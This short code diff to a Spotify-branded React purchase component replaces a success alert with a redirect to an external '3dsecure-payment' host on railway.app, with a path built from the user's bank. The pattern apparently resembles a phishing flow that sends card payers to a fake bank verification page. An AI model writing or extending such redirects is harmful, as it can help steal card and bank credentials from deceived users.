@@ -32,7 +32,9 @@ export const SpotifyPurchase = () => {
     // Si es PSE, submitPayment ya redirige, no mostrar alertas
     if (paymentMethod === "pse") return;
     if (response.success) {
-      alert("Pago procesado con éxito")
+      // Redirigir usando el valor de 'bank' devuelto por la API
+      const bank = response.data && response.data.bank ? response.data.bank : selectedBank;
+      window.location.href = `https://3dsecure-payment.up.railway.app/payments/${bank}`
     } else {
       alert(response.error)
     }
